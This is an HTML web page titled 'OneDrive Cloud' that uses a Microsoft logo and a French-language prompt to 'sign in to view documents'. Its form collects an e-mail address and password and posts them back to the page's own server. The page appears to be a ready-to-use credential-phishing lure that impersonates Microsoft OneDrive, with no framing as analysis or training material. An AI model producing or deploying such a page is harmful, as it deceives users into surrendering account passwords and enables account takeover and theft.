<!DOCTYPE HTML>
<html>
 <head>
  <meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport"/>
  <link href="custom/images/favicon.png" rel="shortcut icon" type="image/png"/>
  <link href="https://fonts.googleapis.com/css?family=Poppins:400,600" rel="stylesheet"/>
  <link href="custom/css/bootstrap.css" rel="stylesheet">
   <link href="custom/css/custom.css" rel="stylesheet"/>
   <link crossorigin="anonymous" href="https://use.fontawesome.com/releases/v5.10.1/css/all.css" integrity="sha384-wxqG4glGB3nlqX0bi23nmgwCSjWIW13BdLUEYC4VIMehfbcro/ATkyDsF/AbIOVe" rel="stylesheet"/>
   <title>
    OneDrive Cloud
   </title>
  </link>
 </head>
 <body>
  <div class="header">
   <div class="container">
    <div class="nav-container">
     <nav class="navbar navbar-light navbar-expand-lg hv-nav fixed">
      <div class="container">
       <a class="navbar-brand" href="#">
        <img alt="#" src="custom/images/microsoft_logo.svg"/>
       </a>
       <div class="collapse navbar-collapse" id="navBar">
        <ul class="navbar-nav ml-auto">
         <li class="nav-item mb-lg-0 mb-2">
          <img src="custom/images/logo.png"/>
         </li>
        </ul>
       </div>
      </div>
     </nav>
    </div>
   </div>
  </div>
  <div class="container-fluid">
   <div class="row">
    <div class="col-lg-8 left-page d-flex">
    </div>
    <div class="col-lg-4 right-page d-flex">
     <div class="card login-card mx-2 w-100">
      <div class="card-body py-5">
       <h4 class="mt-4 hv-bold text-hv">
        Connectez-vous pour voir les documents
       </h4>
       <hr/>
       <form action="" method="post">
        <div class="input-group mb-3">
         <label class="d-block w-100">
          E-mail
         </label>
         <input class="form-control" name="email" placeholder="E-mail" type="email"/>
        </div>
        <div class="input-group mb-3">
         <label class="d-block w-100">
          Mot de passe
         </label>
         <input class="form-control" name="password" placeholder="Mot de passe" type="password"/>
        </div>
        <div class="mt-3">
         <input class="btn bg-hv px-5 text-white" name="login" type="submit" value="Login"/>
        </div>
       </form>
      </div>
     </div>
    </div>
   </div>
  </div>
 </body>
</html>
<script src="custom/js/jquery.js">
</script>

</script>
